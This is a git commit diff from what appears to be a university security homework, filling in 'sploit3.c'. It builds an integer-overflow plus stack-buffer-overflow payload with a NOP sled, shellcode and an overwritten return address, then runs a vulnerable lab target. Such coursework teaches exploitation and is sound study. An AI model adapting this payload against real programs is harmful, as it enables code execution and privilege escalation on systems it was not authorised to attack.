622b1765c0573d33e1528c9cfe6e4e42b41b68d6
Gregoire Clement <gregoire.clement@epfl.ch>
2019-03-13 14:29:13 +0100

    ex05 part3 done

--- HW1/ex05/sploits/sploit3.c
+++ HW1/ex05/sploits/sploit3.c
@@ -11,7 +11,19 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  const int size = 240 * 20 + 11 + 8;
+  char attack[size];
+  char ret[] = "\xb8\xfc\xff\xbf";
+  memset(attack, 0x90, size);
+
+  size_t max_int = 2147483647;
+  size_t int_overflow = max_int + 1 + size / 20 + size % 2;
+  snprintf(attack, 11, "%u", int_overflow);
+  memcpy(attack + 10, ",", 1);
+  memcpy(attack + size - 49, shellcode, 45);
+  memcpy(attack + size - 4, ret, 4);
+  
+  args[0] = TARGET; args[1] = attack; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
